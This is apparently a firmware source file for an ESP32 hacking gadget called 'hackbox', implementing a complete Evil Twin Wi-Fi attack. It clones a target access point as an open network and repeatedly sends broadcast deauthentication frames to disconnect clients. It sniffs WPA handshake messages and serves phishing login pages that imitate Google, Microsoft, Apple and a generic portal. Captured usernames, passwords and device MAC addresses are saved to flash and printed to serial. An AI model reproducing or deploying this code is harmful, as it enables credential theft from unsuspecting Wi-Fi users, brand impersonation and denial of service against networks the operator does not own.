/*
    hackbox
    hackbox custom firmware

    Evil Twin ,Combined deauth + cloned AP + evil portal + EAPOL capture
    Runs in WIFI_MODE_APSTA: AP serves captive portal, STA sends deauth frames
*/

#include "../include/evil_twin.h"
#include "../include/level_system.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include "../include/setting.h"
#include "../include/wifi_utils.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <string.h>
#include <vector>
#include <SPIFFS.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

namespace {

// ===== States =====
enum TwinState {
    TWIN_SCANNING,
    TWIN_SELECT_AP,
    TWIN_SELECT_PORTAL,
    TWIN_RUNNING,
    TWIN_VIEW_CREDS
};

TwinState currentState = TWIN_SCANNING;
bool needsRedraw = true;

// ===== Target AP =====
struct TargetAP {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    int8_t rssi;
};

const int MAX_APS = 30;
TargetAP apList[MAX_APS];
int apCount = 0;
int selectedAP = 0;
int listOffset = 0;

// ===== Portal Templates =====
int selectedTemplate = 0;
const int NUM_TEMPLATES = 4;
const char* tplNames[] = {"Network Login", "Google", "Microsoft", "Apple"};

const char* tplNetworkLogin = R"rawhtml(
<!DOCTYPE html><html><head><title>Network Access</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.08);padding:40px 32px;width:100%;max-width:380px;margin:16px}h1{font-size:20px;font-weight:600;color:#1d1d1f;text-align:center;margin-bottom:4px}.sub{text-align:center;color:#86868b;font-size:13px;margin-bottom:24px}.field{margin-bottom:16px}.field label{display:block;font-size:12px;font-weight:500;color:#6e6e73;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}.field input{width:100%;padding:12px 14px;border:1.5px solid #d2d2d7;border-radius:8px;font-size:15px;outline:none;background:#fafafa}.field input:focus{border-color:#0071e3;background:#fff}.btn{width:100%;padding:13px;background:#0071e3;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}</style>
</head><body><div class="card"><h1>Network Login</h1><p class="sub">Sign in to access the internet</p>
<form action="/login" method="POST"><div class="field"><label>Email or Username</label><input type="text" name="username" required></div>
<div class="field"><label>Password</label><input type="password" name="password" required></div>
<button class="btn" type="submit">Connect</button></form></div></body></html>
)rawhtml";

const char* tplGoogle = R"rawhtml(
<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:28px;padding:48px 40px 36px;width:100%;max-width:420px;margin:16px;box-shadow:0 1px 3px rgba(0,0,0,.08)}.logo{text-align:center;margin-bottom:16px}.logo span{font-size:24px;font-weight:500}.b{color:#4285f4}.r{color:#ea4335}.y{color:#fbbc04}.g{color:#34a853}h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:4px}.sub{text-align:center;color:#5f6368;font-size:16px;margin-bottom:28px}.field{position:relative;margin-bottom:24px}.field input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}.field input:focus{border:2px solid #1a73e8}.btn{padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}</style>
</head><body><div class="card"><div class="logo"><span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span></div>
<h1>Sign in</h1><p class="sub">to continue to WiFi</p>
<form action="/login" method="POST"><div class="field"><input type="text" name="username" placeholder="Email or phone" required></div>
<div class="field"><input type="password" name="password" placeholder="Enter your password" required></div>
<button class="btn" type="submit">Next</button></form></div></body></html>
)rawhtml";

const char* tplMicrosoft = R"rawhtml(
<!DOCTYPE html><html><head><title>Sign in to your account</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center}.outer{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);margin:16px}.grid{display:grid;grid-template-columns:11px 11px;gap:2px;width:24px;margin-bottom:12px}.grid div{width:11px;height:11px}.c1{background:#f25022}.c2{background:#7fba00}.c3{background:#00a4ef}.c4{background:#ffb900}h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:18px}.field{margin-bottom:16px}.field input{width:100%;padding:6px 10px;border:none;border-bottom:1px solid #666;font-size:15px;outline:none}.field input:focus{border-bottom:2px solid #0067b8}.btn{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer}</style>
</head><body><div class="outer"><div class="grid"><div class="c1"></div><div class="c2"></div><div class="c3"></div><div class="c4"></div></div>
<h1>Sign in</h1>
<form action="/login" method="POST"><div class="field"><input type="text" name="username" placeholder="Email, phone, or Skype" required></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button class="btn" type="submit">Sign in</button></form></div></body></html>
)rawhtml";

const char* tplApple = R"rawhtml(
<!DOCTYPE html><html><head><title>Sign in with Apple ID</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:linear-gradient(180deg,#f5f5f7,#e8e8ed);min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:18px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:40px 36px;width:100%;max-width:380px;margin:16px}.logo{text-align:center;margin-bottom:20px;font-size:44px;color:#1d1d1f}h1{font-size:24px;font-weight:600;color:#1d1d1f;text-align:center;margin-bottom:4px}.sub{text-align:center;color:#86868b;font-size:14px;margin-bottom:28px}.field{margin-bottom:2px;border:1px solid #d2d2d7;overflow:hidden}.field:first-of-type{border-radius:12px 12px 0 0;border-bottom:none}.field:last-of-type{border-radius:0 0 12px 12px}.field input{width:100%;padding:14px 16px;border:none;font-size:17px;outline:none;background:#fafafa}.btn{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:500;cursor:pointer;margin-top:20px}</style>
</head><body><div class="card"><div class="logo">&#63743;</div><h1>Apple ID</h1>
<p class="sub">Sign in to access Wi-Fi</p>
<form action="/login" method="POST"><div class="field"><input type="text" name="username" placeholder="Apple ID" required></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button class="btn" type="submit">Sign In</button></form></div></body></html>
)rawhtml";

const char* tplSuccess = R"rawhtml(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.08);padding:40px 32px;width:100%;max-width:400px;text-align:center;margin:16px}.check{width:64px;height:64px;background:#34c759;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff}h1{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:8px}p{color:#86868b;font-size:14px}</style>
</head><body><div class="card"><div class="check">&#10003;</div><h1>Connected</h1><p>You are now connected to the internet.</p></div></body></html>
)rawhtml";

const char* templates[] = { tplNetworkLogin, tplGoogle, tplMicrosoft, tplApple };

// ===== Credentials =====
struct Credential {
    char username[64];
    char password[64];
    char mac[18];
    unsigned long timestamp;
};

std::vector<Credential> creds;
int credViewIndex = 0;

// ===== Deauth =====
volatile uint32_t deauthsSent = 0;
unsigned long lastDeauth = 0;
const unsigned long DEAUTH_INTERVAL = 2000;

// Deauth frame construction now uses shared sendDeauthFrame() from wifi_utils

// ===== EAPOL =====
volatile bool gotMsg1 = false, gotMsg2 = false, gotMsg3 = false, gotMsg4 = false;

// ===== Web Server =====
WebServer twinServer(80);
DNSServer twinDNS;
esp_netif_t *twin_ap_netif = NULL;
int connectedClients = 0;
int totalVisitors = 0;

// ===== Functions =====

void sendDeauth() {
    TargetAP &ap = apList[selectedAP];
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    for (int i = 0; i < 5; i++) {
        sendDeauthFrame(broadcast, ap.bssid, ap.bssid);
        delayMicroseconds(500);
    }
    deauthsSent++;
}

void IRAM_ATTR eapolSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 36) return;

    TargetAP &ap = apList[selectedAP];
    bool fromAP = memcmp(&frame[10], ap.bssid, 6) == 0;
    bool toAP = memcmp(&frame[4], ap.bssid, 6) == 0;
    if (!fromAP && !toAP) return;

    uint8_t fc0 = frame[0];
    uint8_t ftype = (fc0 >> 2) & 0x03;
    if (ftype != 2) return;

    int hdrLen = 24;
    uint8_t fsubtype = (fc0 >> 4) & 0x0F;
    if (fsubtype & 0x08) hdrLen += 2;
    if (len < hdrLen + 8) return;

    const uint8_t *llc = &frame[hdrLen];
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    uint16_t etherType = (llc[6] << 8) | llc[7];
    if (etherType != 0x888E) return;

    const uint8_t *eapol = &llc[8];
    int eapolLen = len - hdrLen - 8;
    if (eapolLen < 99) return;
    if (eapol[1] != 3) return;

    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    bool keyAck = (keyInfo >> 7) & 1;
    bool keyMIC = (keyInfo >> 8) & 1;
    bool secure = (keyInfo >> 9) & 1;
    bool install = (keyInfo >> 6) & 1;

    if (keyAck && !keyMIC && fromAP) { gotMsg1 = true; needsRedraw = true; }
    if (!keyAck && keyMIC && !secure && toAP) { gotMsg2 = true; needsRedraw = true; }
    if (keyAck && keyMIC && install && fromAP) { gotMsg3 = true; needsRedraw = true; }
    if (!keyAck && keyMIC && secure && toAP) { gotMsg4 = true; needsRedraw = true; }
}

void handlePortal() {
    twinServer.send(200, "text/html", templates[selectedTemplate]);
    totalVisitors++;
    needsRedraw = true;
}

void handleLogin() {
    String user = twinServer.arg("username");
    String pass = twinServer.arg("password");

    if (user.length() > 0 && pass.length() > 0) {
        Credential c;
        strncpy(c.username, user.c_str(), sizeof(c.username) - 1);
        c.username[sizeof(c.username) - 1] = '\0';
        strncpy(c.password, pass.c_str(), sizeof(c.password) - 1);
        c.password[sizeof(c.password) - 1] = '\0';
        // Sanitize fields that are about to be written as CSV. A captured
        // password containing a comma or newline would otherwise corrupt
        // /creds.csv and break loadSavedCreds() on the next boot.
        for (char *s = c.username; *s; ++s) if (*s == ',' || *s == '\n' || *s == '\r') *s = '_';
        for (char *s = c.password; *s; ++s) if (*s == ',' || *s == '\n' || *s == '\r') *s = '_';

        wifi_sta_list_t staList;
        if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK && staList.num > 0) {
            int idx = staList.num - 1;
            snprintf(c.mac, sizeof(c.mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                     staList.sta[idx].mac[0], staList.sta[idx].mac[1],
                     staList.sta[idx].mac[2], staList.sta[idx].mac[3],
                     staList.sta[idx].mac[4], staList.sta[idx].mac[5]);
        } else {
            strncpy(c.mac, "Unknown", sizeof(c.mac) - 1);
            c.mac[sizeof(c.mac) - 1] = '\0';
        }

        c.timestamp = millis();
        creds.push_back(c);
        addXP(10);

        // Persist to SPIFFS. SSID comes from a live scan and can contain
        // commas/newlines just like attacker-supplied creds, so sanitize a
        // local copy before writing ,otherwise a funky AP name corrupts
        // /creds.csv and breaks loadSavedCreds() on the next boot.
        char safeSSID[33];
        strncpy(safeSSID, apList[selectedAP].ssid, sizeof(safeSSID) - 1);
        safeSSID[sizeof(safeSSID) - 1] = '\0';
        for (char *s = safeSSID; *s; ++s) {
            if (*s == ',' || *s == '\n' || *s == '\r') *s = '_';
        }

        File f = SPIFFS.open("/creds.csv", FILE_APPEND);
        if (f) {
            f.printf("%s,%s,%s,%s,%lu\n", safeSSID, c.username, c.password, c.mac, c.timestamp);
            f.close();
        }

        // Print to serial. Use the same sanitized SSID we just wrote to
        // /creds.csv so a newline in the AP name can't split this log line
        // in half and confuse any host-side tool tailing the capture.
        Serial.printf("# CRED CAPTURED | SSID: %s | User: %s | Pass: %s | MAC: %s\n",
                       safeSSID, c.username, c.password, c.mac);
        needsRedraw = true;
    }

    twinServer.send(200, "text/html", tplSuccess);
}

void startEvilTwin() {
    TargetAP &ap = apList[selectedAP];

    // Stop any existing WiFi
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    delay(50);

    // Create AP netif
    if (twin_ap_netif) { esp_netif_destroy(twin_ap_netif); twin_ap_netif = NULL; }
    twin_ap_netif = esp_netif_create_default_wifi_ap();

    // Init WiFi in APSTA mode
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    // Configure AP with cloned SSID. Copy the full SSID (up to 32 bytes -- the
    // wifi_config_t.ap.ssid field) using memcpy so we don't lose the 32nd byte
    // to strncpy's "leave room for NUL" trick. The wire format uses ssid_len,
    // not a NUL terminator, so an exact 32-char clone needs all 32 bytes.
    wifi_config_t ap_config = {};
    size_t cloneLen = strlen(ap.ssid);
    if (cloneLen > sizeof(ap_config.ap.ssid)) cloneLen = sizeof(ap_config.ap.ssid);
    memcpy(ap_config.ap.ssid, ap.ssid, cloneLen);
    ap_config.ap.ssid_len = cloneLen;
    ap_config.ap.channel = ap.channel;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 8;
    ap_config.ap.beacon_interval = 100;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    esp_wifi_start();
    delay(200);

    // Pin to target channel
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

    // Enable EAPOL sniffing on STA
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(eapolSniffer);
    esp_wifi_set_promiscuous(true);

    // Start DNS + web server
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(twin_ap_netif, &ip_info) == ESP_OK) {
        IPAddress apIP(ip_info.ip.addr);
        twinDNS.start(53, "*", apIP);
    }

    twinServer.on("/", handlePortal);
    twinServer.on("/login", HTTP_POST, handleLogin);
    twinServer.on("/generate_204", handlePortal);
    twinServer.on("/hotspot-detect.html", handlePortal);
    twinServer.on("/connecttest.txt", handlePortal);
    twinServer.on("/redirect", handlePortal);
    twinServer.on("/canonical.html", handlePortal);
    twinServer.on("/success.txt", handlePortal);
    twinServer.onNotFound(handlePortal);
    twinServer.begin();

    // Reset counters
    deauthsSent = 0;
    lastDeauth = 0;
    connectedClients = 0;
    totalVisitors = 0;
    gotMsg1 = false; gotMsg2 = false; gotMsg3 = false; gotMsg4 = false;
    creds.clear();

    currentState = TWIN_RUNNING;
    needsRedraw = true;
}

// ===== Display =====
void drawScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);

    switch (currentState) {
        case TWIN_SCANNING:
            u8g2.drawStr(0, 8, "Evil Twin - Scanning...");
            {
                char buf[32];
                snprintf(buf, sizeof(buf), "Found: %d APs", apCount);
                u8g2.drawStr(0, 20, buf);
            }
            u8g2.drawStr(0, 62, "Please wait...");
            break;

        case TWIN_SELECT_AP:
            u8g2.drawStr(0, 8, "Select Target AP:");
            u8g2.drawHLine(0, 10, 128);
            if (apCount == 0) {
                u8g2.drawStr(0, 28, "No APs found");
                u8g2.drawStr(0, 40, "R=Rescan");
                u8g2.drawStr(0, 62, "L=Exit");
            } else {
                for (int i = 0; i < 5 && (listOffset + i) < apCount; i++) {
                    int idx = listOffset + i;
                    TargetAP &a = apList[idx];
                    char line[28];
                    char ssidShort[15];
                    strncpy(ssidShort, a.ssid, 14);
                    ssidShort[14] = '\0';
                    snprintf(line, sizeof(line), "%s%-14s %ddBm",
                             idx == selectedAP ? ">" : " ", ssidShort, a.rssi);
                    u8g2.drawStr(0, 20 + (i * 9), line);
                }
                u8g2.drawStr(0, 62, "U/D=Scroll R=Select");
            }
            break;

        case TWIN_SELECT_PORTAL:
            u8g2.drawStr(0, 8, "Select Portal Template:");
            u8g2.drawHLine(0, 10, 128);
            for (int i = 0; i < NUM_TEMPLATES; i++) {
                char line[28];
                snprintf(line, sizeof(line), "%s %s",
                         i == selectedTemplate ? ">" : " ", tplNames[i]);
                u8g2.drawStr(0, 22 + (i * 10), line);
            }
            u8g2.drawStr(0, 62, "U/D=Scroll R=Start L=Back");
            break;

        case TWIN_RUNNING: {
            TargetAP &a = apList[selectedAP];
            char buf[32];

            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "EVIL TWIN ACTIVE");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            snprintf(buf, sizeof(buf), "AP: %.16s Ch:%d", a.ssid, a.channel);
            u8g2.drawStr(0, 22, buf);

            snprintf(buf, sizeof(buf), "Clients:%d Visits:%d Creds:%d",
                     connectedClients, totalVisitors, (int)creds.size());
            u8g2.drawStr(0, 32, buf);

            snprintf(buf, sizeof(buf), "Deauths:%lu  [%s]",
                     (unsigned long)deauthsSent, tplNames[selectedTemplate]);
            u8g2.drawStr(0, 42, buf);

            snprintf(buf, sizeof(buf), "EAPOL: %s%s%s%s",
                     gotMsg1 ? "M1 " : "-- ",
                     gotMsg2 ? "M2 " : "-- ",
                     gotMsg3 ? "M3 " : "-- ",
                     gotMsg4 ? "M4" : "--");
            u8g2.drawStr(0, 52, buf);

            u8g2.drawStr(0, 62, "R=Creds  L=Stop");
            break;
        }

        case TWIN_VIEW_CREDS:
            if (creds.empty()) {
                u8g2.drawStr(0, 10, "No credentials yet");
                u8g2.drawStr(0, 62, "L=Back");
            } else {
                Credential &c = creds[credViewIndex];
                char buf[32];

                snprintf(buf, sizeof(buf), "Cred %d/%d", credViewIndex + 1, (int)creds.size());
                u8g2.drawStr(0, 8, buf);
                u8g2.drawHLine(0, 10, 128);

                snprintf(buf, sizeof(buf), "MAC: %.17s", c.mac);
                u8g2.drawStr(0, 20, buf);

                snprintf(buf, sizeof(buf), "U: %.22s", c.username);
                u8g2.drawStr(0, 30, buf);

                snprintf(buf, sizeof(buf), "P: %.22s", c.password);
                u8g2.drawStr(0, 40, buf);

                unsigned long ago = (millis() - c.timestamp) / 60000;
                snprintf(buf, sizeof(buf), "%lum ago", ago);
                u8g2.drawStr(0, 50, buf);

                u8g2.drawStr(0, 62, "U/D=Scroll L=Back");
            }
            break;
    }

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void startScan() {
    apCount = 0;
    currentState = TWIN_SCANNING;
    needsRedraw = true;
    drawScreen();

    esp_netif_init();
    esp_event_loop_create_default();
    initWiFi(WIFI_MODE_STA);
    delay(500); // Let WiFi stack settle

    wifi_scan_config_t scanCfg = {};
    scanCfg.channel = 0; // All channels
    scanCfg.show_hidden = false;
    scanCfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    scanCfg.scan_time.active.min = 200;
    scanCfg.scan_time.active.max = 500;
    esp_wifi_scan_start(&scanCfg, true); // Blocking scan

    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    if (num > MAX_APS) num = MAX_APS;

    wifi_ap_record_t *records = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * num);
    if (records) {
        esp_wifi_scan_get_ap_records(&num, records);
        for (int i = 0; i < num; i++) {
            if (records[i].authmode == WIFI_AUTH_OPEN) continue;
            strncpy(apList[apCount].ssid, (char*)records[i].ssid, 32);
            apList[apCount].ssid[32] = '\0';
            memcpy(apList[apCount].bssid, records[i].bssid, 6);
            apList[apCount].channel = records[i].primary;
            apList[apCount].rssi = records[i].rssi;
            apCount++;
        }
        free(records);
    }

    selectedAP = 0;
    listOffset = 0;
    currentState = TWIN_SELECT_AP;
    needsRedraw = true;
}

}

// ===== Public API =====

void loadSavedCreds() {
    if (!SPIFFS.exists("/creds.csv")) return;
    File f = SPIFFS.open("/creds.csv", FILE_READ);
    if (!f) return;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        if (line.length() < 5) continue;
        // Parse: ssid,username,password,mac,timestamp
        int p1 = line.indexOf(',');
        int p2 = line.indexOf(',', p1 + 1);
        int p3 = line.indexOf(',', p2 + 1);
        int p4 = line.indexOf(',', p3 + 1);
        if (p1 < 0 || p2 < 0 || p3 < 0 || p4 < 0) continue;

        Credential c;
        strncpy(c.username, line.substring(p1 + 1, p2).c_str(), sizeof(c.username) - 1);
        c.username[sizeof(c.username) - 1] = '\0';
        strncpy(c.password, line.substring(p2 + 1, p3).c_str(), sizeof(c.password) - 1);
        c.password[sizeof(c.password) - 1] = '\0';
        strncpy(c.mac, line.substring(p3 + 1, p4).c_str(), sizeof(c.mac) - 1);
        c.mac[sizeof(c.mac) - 1] = '\0';
        c.timestamp = line.substring(p4 + 1).toInt();
        creds.push_back(c);
    }
    f.close();
}

void evilTwinSetup() {
    currentState = TWIN_SCANNING;
    needsRedraw = true;
    twin_ap_netif = NULL;
    selectedTemplate = 0;
    credViewIndex = 0;

    SPIFFS.begin(true);
    loadSavedCreds();

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

    startScan();
}

void evilTwinLoop() {
    unsigned long now = millis();

    static bool upPrev = false, downPrev = false, rightPrev = false, leftPrev = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;

    // Service web clients when running
    if (currentState == TWIN_RUNNING || currentState == TWIN_VIEW_CREDS) {
        twinDNS.processNextRequest();
        twinServer.handleClient();

        // Update client count
        wifi_sta_list_t staList;
        if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK) {
            if (connectedClients != staList.num) {
                connectedClients = staList.num;
                needsRedraw = true;
            }
        }
    }

    switch (currentState) {
        case TWIN_SELECT_AP:
            if (upNow && !upPrev && apCount > 0) {
                selectedAP--;
                if (selectedAP < 0) selectedAP = apCount - 1;
                if (selectedAP < listOffset) listOffset = selectedAP;
                needsRedraw = true;
                delay(150);
            }
            if (downNow && !downPrev && apCount > 0) {
                selectedAP++;
                if (selectedAP >= apCount) selectedAP = 0;
                if (selectedAP >= listOffset + 5) listOffset = selectedAP - 4;
                if (selectedAP == 0) listOffset = 0;
                needsRedraw = true;
                delay(150);
            }
            if (rightNow && !rightPrev) {
                if (apCount > 0) {
                    currentState = TWIN_SELECT_PORTAL;
                    needsRedraw = true;
                } else {
                    // Rescan
                    cleanupWiFi();
                    delay(100);
                    startScan();
                }
                delay(200);
            }
            break;

        case TWIN_SELECT_PORTAL:
            if (upNow && !upPrev) {
                selectedTemplate = (selectedTemplate - 1 + NUM_TEMPLATES) % NUM_TEMPLATES;
                needsRedraw = true;
                delay(150);
            }
            if (downNow && !downPrev) {
                selectedTemplate = (selectedTemplate + 1) % NUM_TEMPLATES;
                needsRedraw = true;
                delay(150);
            }
            if (rightNow && !rightPrev) {
                startEvilTwin();
                delay(200);
            }
            if (leftNow && !leftPrev) {
                currentState = TWIN_SELECT_AP;
                needsRedraw = true;
                delay(200);
            }
            break;

        case TWIN_RUNNING:
            // Send deauth periodically
            if (now - lastDeauth >= DEAUTH_INTERVAL) {
                lastDeauth = now;
                sendDeauth();
                needsRedraw = true;
            }
            if (rightNow && !rightPrev) {
                credViewIndex = 0;
                currentState = TWIN_VIEW_CREDS;
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPrev) {
                // Stop
                twinServer.stop();
                twinDNS.stop();
                esp_wifi_set_promiscuous(false);
                currentState = TWIN_SELECT_AP;
                needsRedraw = true;
                delay(200);
            }
            break;

        case TWIN_VIEW_CREDS:
            if (upNow && !upPrev && !creds.empty()) {
                credViewIndex = (credViewIndex - 1 + creds.size()) % creds.size();
                needsRedraw = true;
                delay(150);
            }
            if (downNow && !downPrev && !creds.empty()) {
                credViewIndex = (credViewIndex + 1) % creds.size();
                needsRedraw = true;
                delay(150);
            }
            if (leftNow && !leftPrev) {
                currentState = TWIN_RUNNING;
                needsRedraw = true;
                delay(200);
            }
            break;

        default:
            break;
    }

    upPrev = upNow;
    downPrev = downNow;
    rightPrev = rightNow;
    leftPrev = leftNow;

    if (needsRedraw) {
        needsRedraw = false;
        drawScreen();
    }
}

void cleanupEvilTwin() {
    twinServer.stop();
    twinDNS.stop();
    esp_wifi_set_promiscuous(false);
    cleanupWiFi();
    // Don't leave captured credentials sitting in heap after the tool exits.
    creds.clear();
    creds.shrink_to_fit();
    twin_ap_netif = NULL;
}
